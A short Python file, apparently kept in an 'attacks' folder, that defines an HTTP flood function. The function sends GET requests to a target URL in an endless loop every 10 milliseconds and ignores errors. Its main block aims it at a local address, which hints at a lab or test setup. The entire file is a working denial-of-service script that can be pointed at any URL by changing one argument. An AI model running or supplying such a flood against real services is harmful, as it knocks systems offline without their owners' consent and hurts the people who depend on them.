# attacks/http_flood.py
import requests
import time

def http_flood(target_url):
    while True:
        try:
            requests.get(target_url)
        except Exception:
            pass
        time.sleep(0.01)

if __name__ == "__main__":
    http_flood("http://127.0.0.1:5000")

